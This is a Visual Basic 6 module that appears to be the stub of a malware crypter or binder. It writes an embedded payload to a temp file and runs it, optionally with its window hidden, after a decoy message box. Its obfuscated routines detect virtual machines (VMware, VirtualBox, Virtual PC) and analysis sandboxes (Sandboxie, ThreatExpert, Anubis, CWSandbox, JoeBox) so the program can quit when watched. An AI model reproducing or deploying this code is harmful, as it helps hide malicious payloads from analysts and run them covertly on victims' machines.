Attribute VB_Name = "mFunctions"
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Public Declare Function Module32First Lib "kernel32" (ByVal hSnapShot As Long, lppe As MODULEENTRY32) As Long
Public Declare Function Module32Next Lib "kernel32" (ByVal hSnapShot As Long, lppe As MODULEENTRY32) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Public Declare Function RegOpenKeyEx Lib "advapi32" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As Long) As Long
Public Declare Function RegQueryValueEx Lib "advapi32" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, ByRef lpType As Long, ByVal lpData As String, ByRef lpcbData As Long) As Long
Public Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long

Public Type MODULEENTRY32
    dwSize As Long
    th32ModuleID As Long
    th32ProcessID As Long
    GlblcntUsage As Long
    ProccntUsage As Long
    modBaseAddr As Byte
    modBaseSize As Long
    hModule As Long
    szModule As String * 256
    szExePath As String * 1024
End Type

Const HKEY_LOCAL_MACHINE = &H80000002
Const REG_SZ = 1&
Const KEY_ALL_ACCESS = &H3F
Const TH32CS_SNAPMODULE = &H8
Const SW_HIDE = 0
Const SW_SHOWNORMAL = 1

Public Buff() As Byte, File As String, fDat() As String, x As Integer, xBuff As String, fExt As String
Public fBuff As String, pDat() As String, fPath As String, fExec As String, fVisible As String, sNum As Integer

Public Function ihk9j6cnfinukzonmi6983so2c218t17s2nkp3bmsc0p2lu798(sFile As String, Path As String, Exec As String, Visible As String, Ext As String)
  sNum = sNum + 1
  File = FreeFile
  Path = Environ(Replace(Path, Chr(37), ""))
  Open Path & Chr(92) & Chr(116) & Chr(109) & Chr(112) & sNum & Ext For Binary As File
   Put File, , sFile
  Close File
  If Exec = Chr(89) & Chr(101) & Chr(115) And Visible = Chr(89) & Chr(101) & Chr(115) Then Call ShellExecute(0, "", Path & Chr(92) & Chr(116) & Chr(109) & Chr(112) & sNum & Ext, "", "", SW_SHOWNORMAL)
  If Exec = Chr(89) & Chr(101) & Chr(115) And Visible = Chr(78) & Chr(111) Then Call ShellExecute(0, "", Path & Chr(92) & Chr(116) & Chr(109) & Chr(112) & sNum & Ext, "", "", SW_HIDE)
End Function

Public Function wnw67r8szeaqnz2azfpcou6c7cz4f0a7aiehr9ytwob2ncyd2d(mSG As String, tTl As String, tyP As String, Anb As String, VM As String, vBox As String, vPC As String, sBox As String, jBox As String, sBoxie As String, cThreat As String)
 Select Case tyP
  Case Chr(69) & Chr(114) & Chr(114) & Chr(111) & Chr(114): tyP = vbCritical
  Case Chr(73) & Chr(110) & Chr(102) & Chr(111) & Chr(114) & Chr(109) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110): tyP = vbInformation
  Case Chr(69) & Chr(120) & Chr(99) & Chr(108) & Chr(97) & Chr(109) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110): tyP = vbExclamation
  Case Chr(81) & Chr(117) & Chr(101) & Chr(115) & Chr(116) & Chr(105) & Chr(111) & Chr(110): tyP = vbQuestion
 End Select
 If mSG <> "" Or tTl <> "" Then MsgBox mSG, tyP, tTl
 
 If Anb = 1 Then If j807y69dc5ybg9eyw2v6rjgimaguquejhbwc6c9hp6or71j91u = 3 Then End
 If VM = 1 Then If gz7cq8k6k03wrga33hqf56h2vg8b5s9fdg61vjgxzqfkrsg3ox = 2 Then End
 If vBox = 1 Then If gz7cq8k6k03wrga33hqf56h2vg8b5s9fdg61vjgxzqfkrsg3ox = 3 Then End
 If vPC = 1 Then If gz7cq8k6k03wrga33hqf56h2vg8b5s9fdg61vjgxzqfkrsg3ox = 1 Then End
 If sBox = 1 Then If j807y69dc5ybg9eyw2v6rjgimaguquejhbwc6c9hp6or71j91u = 4 Then End
 If jBox = 1 Then If j807y69dc5ybg9eyw2v6rjgimaguquejhbwc6c9hp6or71j91u = 5 Then End
 If sBoxie = 1 Then If j807y69dc5ybg9eyw2v6rjgimaguquejhbwc6c9hp6or71j91u = 1 Then End
 If cThreat = 1 Then If j807y69dc5ybg9eyw2v6rjgimaguquejhbwc6c9hp6or71j91u = 2 Then End
End Function

Public Function gz7cq8k6k03wrga33hqf56h2vg8b5s9fdg61vjgxzqfkrsg3ox() As Long
    Dim lhKey       As Long
    Dim sBuffer     As String
    Dim lLen        As Long

    If RegOpenKeyEx(&H80000002, Chr(83) & Chr(89) & Chr(83) & Chr(84) & Chr(69) & Chr(77) & Chr(92) & Chr(67) & Chr(111) & Chr(110) & Chr(116) & Chr(114) & Chr(111) & Chr(108) & Chr(83) & Chr(101) & Chr(116) & Chr(48) & Chr(48) & Chr(49) & Chr(92) & Chr(83) & Chr(101) & Chr(114) & Chr(118) & Chr(105) & Chr(99) & Chr(101) & Chr(115) & Chr(92) & Chr(68) & Chr(105) & Chr(115) & Chr(107) & Chr(92) & Chr(69) & Chr(110) & Chr(117) & Chr(109), _
       0, &H20019, lhKey) = 0 Then
        sBuffer = Space$(255): lLen = 255
        If RegQueryValueEx(lhKey, Chr(48), 0, 1, ByVal sBuffer, lLen) = 0 Then
            sBuffer = UCase(Left$(sBuffer, lLen - 1))
            Select Case True
                Case sBuffer Like Chr(42) & Chr(86) & Chr(73) & Chr(82) & Chr(84) & Chr(85) & Chr(65) & Chr(76) & Chr(42):   gz7cq8k6k03wrga33hqf56h2vg8b5s9fdg61vjgxzqfkrsg3ox = 1
                Case sBuffer Like Chr(42) & Chr(86) & Chr(77) & Chr(87) & Chr(65) & Chr(82) & Chr(69) & Chr(42):    gz7cq8k6k03wrga33hqf56h2vg8b5s9fdg61vjgxzqfkrsg3ox = 2
                Case sBuffer Like Chr(42) & Chr(86) & Chr(66) & Chr(79) & Chr(88) & Chr(42):      gz7cq8k6k03wrga33hqf56h2vg8b5s9fdg61vjgxzqfkrsg3ox = 3
            End Select
        End If
        Call RegCloseKey(lhKey)
    End If
End Function

' Function by RedShark

Public Function j807y69dc5ybg9eyw2v6rjgimaguquejhbwc6c9hp6or71j91u() As Long
 Dim hKey As Long, hOpen As Long, hQuery As Long, hSnapShot As Long
 Dim me32 As MODULEENTRY32
 Dim szBuffer As String * 128
 
 hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId)
 me32.dwSize = Len(me32)
 Module32First hSnapShot, me32
 Do While Module32Next(hSnapShot, me32) <> 0
    If InStr(1, LCase(me32.szModule), Chr(115) & Chr(98) & Chr(105) & Chr(101) & Chr(100) & Chr(108) & Chr(108) & Chr(46) & Chr(100) & Chr(108) & Chr(108)) > 0 Then 'Sandboxie
        j807y69dc5ybg9eyw2v6rjgimaguquejhbwc6c9hp6or71j91ues = 1
    ElseIf InStr(1, LCase(me32.szModule), Chr(100) & Chr(98) & Chr(103) & Chr(104) & Chr(101) & Chr(108) & Chr(112) & Chr(46) & Chr(100) & Chr(108) & Chr(108)) > 0 Then 'ThreatExpert
        j807y69dc5ybg9eyw2v6rjgimaguquejhbwc6c9hp6or71j91ues = 2
    End If
 Loop
 CloseHandle (hSnapShot)
 If j807y69dc5ybg9eyw2v6rjgimaguquejhbwc6c9hp6or71j91u = False Then
    hOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(67) & Chr(117) & Chr(114) & Chr(114) & Chr(101) & Chr(110) & Chr(116) & Chr(86) & Chr(101) & Chr(114) & Chr(115) & Chr(105) & Chr(111) & Chr(110), 0, KEY_ALL_ACCESS, hKey)
    If hOpen = 0 Then
        hQuery = RegQueryValueEx(hKey, Chr(80) & Chr(114) & Chr(111) & Chr(100) & Chr(117) & Chr(99) & Chr(116) & Chr(73) & Chr(100), 0, REG_SZ, szBuffer, 128)
        If hQuery = 0 Then
            If InStr(1, szBuffer, Chr(55) & Chr(54) & Chr(52) & Chr(56) & Chr(55) & Chr(45) & Chr(51) & Chr(51) & Chr(55) & Chr(45) & Chr(56) & Chr(52) & Chr(50) & Chr(57) & Chr(57) & Chr(53) & Chr(53) & Chr(45) & Chr(50) & Chr(50) & Chr(54) & Chr(49) & Chr(52)) > 0 Then 'Anubis
                j807y69dc5ybg9eyw2v6rjgimaguquejhbwc6c9hp6or71j91ues = 3
            ElseIf InStr(1, szBuffer, Chr(55) & Chr(54) & Chr(52) & Chr(56) & Chr(55) & Chr(45) & Chr(54) & Chr(52) & Chr(52) & Chr(45) & Chr(51) & Chr(49) & Chr(55) & Chr(55) & Chr(48) & Chr(51) & Chr(55) & Chr(45) & Chr(50) & Chr(51) & Chr(53) & Chr(49) & Chr(48)) > 0 Then 'CWSandbox
                j807y69dc5ybg9eyw2v6rjgimaguquejhbwc6c9hp6or71j91ues = 4
            ElseIf InStr(1, szBuffer, Chr(53) & Chr(53) & Chr(50) & Chr(55) & Chr(52) & Chr(45) & Chr(54) & Chr(52) & Chr(48) & Chr(45) & Chr(50) & Chr(54) & Chr(55) & Chr(51) & Chr(48) & Chr(54) & Chr(52) & Chr(45) & Chr(50) & Chr(51) & Chr(57) & Chr(53) & Chr(48)) > 0 Then 'JoeBox
                j807y69dc5ybg9eyw2v6rjgimaguquejhbwc6c9hp6or71j91ues = 5
            End If
        End If
    End If
    RegCloseKey (hKey)
 End If
End Function








